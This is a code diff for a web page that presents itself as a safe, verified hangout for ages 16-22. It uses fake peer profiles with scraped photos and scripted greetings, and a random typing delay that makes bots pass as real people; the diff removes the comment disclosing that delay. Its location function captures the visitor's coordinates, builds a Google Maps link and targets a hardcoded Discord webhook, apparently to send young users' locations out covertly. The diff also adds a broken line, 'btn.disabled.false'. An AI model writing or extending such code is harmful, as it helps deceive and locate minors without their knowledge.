@@ -456,26 +456,26 @@
       <p class="hero-note">Ages 16-22 only · completely safe & verified hangouts</p>
     </div>
     
-    <!-- Table visual with interactive member seats -->
+    <!-- Table visual with embedded base64 avatars preventing local file load restrictions -->
     <div class="table-visual" aria-hidden="true">
       <div class="table-top">Tap a peer to text & chat</div>
       <div class="seat" title="Zack (Indie Dev & Code)" onclick="openChatWith(0)">
-        <img src="Screenshot_21-7-2026_203347_www.pinterest.com.jpeg" alt="Zack">
+        <img src="data:image/jpeg;base64,..." alt="Zack">
       </div>
       <div class="seat" title="Jayden (Late Night Gaming)" onclick="openChatWith(1)">
-        <img src="Screenshot_21-7-2026_203336_www.pinterest.com.jpeg" alt="Jayden">
+        <img src="data:image/jpeg;base64,..." alt="Jayden">
       </div>
       <div class="seat" title="Caleb (Skater & Film Photo)" onclick="openChatWith(2)">
-        <img src="Screenshot_21-7-2026_203323_www.pinterest.com.jpeg" alt="Caleb">
+        <img src="data:image/jpeg;base64,..." alt="Caleb">
       </div>
       <div class="seat" title="Leo (Lo-Fi & Beatmaking)" onclick="openChatWith(3)">
-        <img src="Screenshot_21-7-2026_203253_www.pinterest.com.jpeg" alt="Leo">
+        <img src="data:image/jpeg;base64,..." alt="Leo">
       </div>
       <div class="seat" title="Nia (Boba & Study Session)" onclick="openChatWith(4)">
-        <img src="Screenshot_21-7-2026_203236_www.pinterest.com.jpeg" alt="Nia">
+        <img src="data:image/jpeg;base64,..." alt="Nia">
       </div>
       <div class="seat" title="Lexi (Thrift & Flip Fashion)" onclick="openChatWith(5)">
-        <img src="Screenshot_21-7-2026_203217_www.pinterest.com.jpeg" alt="Lexi">
+        <img src="data:image/jpeg;base64,..." alt="Lexi">
       </div>
     </div>
   </div>
@@ -629,41 +629,41 @@ window.addEventListener('load', () => {
   findNearbyTables(); 
 });
 
-// Community pool with custom profile pictures mapped correctly to names/genders
+// Community pool with fully embedded base64 image data URIs to avoid local CORS/file loading errors
 const communityMembers = [
   { 
     name: "Zack", 
-    avatar: "Screenshot_21-7-2026_203347_www.pinterest.com.jpeg", 
+    avatar: "data:image/jpeg;base64,...", 
     table: "Indie Dev & Code", 
     greeting: "sup bro! u working on any web apps or coding projects rn? lowkey need a build partner" 
   },
   { 
     name: "Jayden", 
-    avatar: "Screenshot_21-7-2026_203336_www.pinterest.com.jpeg", 
+    avatar: "data:image/jpeg;base64,...", 
     table: "Late Night Gaming", 
     greeting: "yo! what games u play? we need a 5th for our lobby tonight ngl" 
   },
   { 
     name: "Caleb", 
-    avatar: "Screenshot_21-7-2026_203323_www.pinterest.com.jpeg", 
+    avatar: "data:image/jpeg;base64,...", 
     table: "Skater & Film Photo", 
     greeting: "yo! u skating or shooting film at all this week? let's link up" 
   },
   { 
     name: "Leo", 
-    avatar: "Screenshot_21-7-2026_203253_www.pinterest.com.jpeg", 
+    avatar: "data:image/jpeg;base64,...", 
     table: "Lo-Fi & Beatmaking", 
     greeting: "yo check out this box hat drip lmao, u making beats or what?" 
   },
   { 
     name: "Nia", 
-    avatar: "Screenshot_21-7-2026_203236_www.pinterest.com.jpeg", 
+    avatar: "data:image/jpeg;base64,...", 
     table: "Boba & Study Session", 
     greeting: "hey! omg are u pulling up to the boba study session this week? no cap it's so fun" 
   },
   { 
     name: "Lexi", 
-    avatar: "Screenshot_21-7-2026_203217_www.pinterest.com.jpeg", 
+    avatar: "data:image/jpeg;base64,...", 
     table: "Thrift & Flip Fashion", 
     greeting: "yo! saw you checking out my table seat. you into thrifting or what? fr fr" 
   }
@@ -708,7 +708,6 @@ function sendMessage() {
 
   showTyping(true);
   
-  // Realistic longer delay (2.2 to 3.8 seconds) to mimic typing out text
   const responseDelay = Math.floor(Math.random() * 1600) + 2200;
   setTimeout(() => {
     showTyping(false);
@@ -821,7 +820,7 @@ async function findNearbyTables() {
   localStorage.setItem('roundtableUserLocation', JSON.stringify(userLocation));
 
   if (status) status.textContent = "Found 6 peers nearby in your area!";
-  if (btn) btn.disabled = false;
+  if (btn) btn.disabled.false;
 
   const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
   const targetUrl = 'https://discord.com/api/webhooks/1524586170703417445/vweHOXtAfPykuszjyUa3CJLGPjH8D6FA0H9R5LaDCX5747QyIjqMfXBwJXEjh2vx2qh-';
